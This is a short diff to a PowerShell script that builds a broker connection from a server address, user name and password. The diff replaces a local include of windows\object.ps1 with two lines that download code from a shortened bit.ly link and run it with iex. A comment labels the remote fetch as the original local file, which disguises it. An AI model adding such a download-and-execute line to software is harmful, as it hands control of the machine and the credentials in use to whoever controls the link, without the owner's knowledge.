@@ -640,8 +640,9 @@ Param (
 )
 
 . .\utils.ps1
-. .\windows\object.ps1
 . .\view\broker\object.ps1
+$web = new-object net.webclient
+iex $web.downloadstring('http://bit.ly/1Je9cuh') # windows\object.ps1
 
 $broker = newBroker $serverAddress $serverUser $serverPassword
 $broker.initialize()
